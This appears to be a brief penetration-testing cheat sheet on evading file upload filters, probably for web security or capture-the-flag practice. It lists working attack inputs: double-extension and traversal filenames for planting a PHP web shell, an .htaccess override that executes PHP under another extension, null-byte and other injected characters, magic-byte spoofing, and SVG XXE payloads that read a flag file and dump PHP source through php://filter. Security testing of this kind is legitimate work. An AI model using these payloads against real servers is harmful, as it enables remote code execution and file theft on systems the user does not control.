https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt

##### Double extension 
`.jpg.php`

##### Reverse Double Extension
`.php.jpg`

##### Upload to different directory
```
Content-Disposition: form-data; name="avatar"; filename="../shell3.php"
```

Trying to bypass filters:
```
filename="..%2fshell3.php"
```

then open `avatars/../shell3.php`

##### Replace .htaccess if some extensions are not allowed

```
AddType application/x-httpd-php .nope
```

##### Character Injection

- `%20`
- `%0a`
- `%00`
- `%0d0a`
- `/`
- `.\`
- `.`
- `…`
- `:`

Content-type:

in the zero bytes of file:

`GIF8`
`PNG`

https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt

Mime types:

[File Signature](https://en.wikipedia.org/wiki/List_of_file_signatures) or [Magic Bytes](https://web.archive.org/web/20240522030920/https://opensource.apple.com/source/file/file-23/file/magic/magic.mime).

SVG/XML:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "/flag.txt"> ]>
<svg>&xxe;</svg>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]>
<svg>&xxe;</svg>
```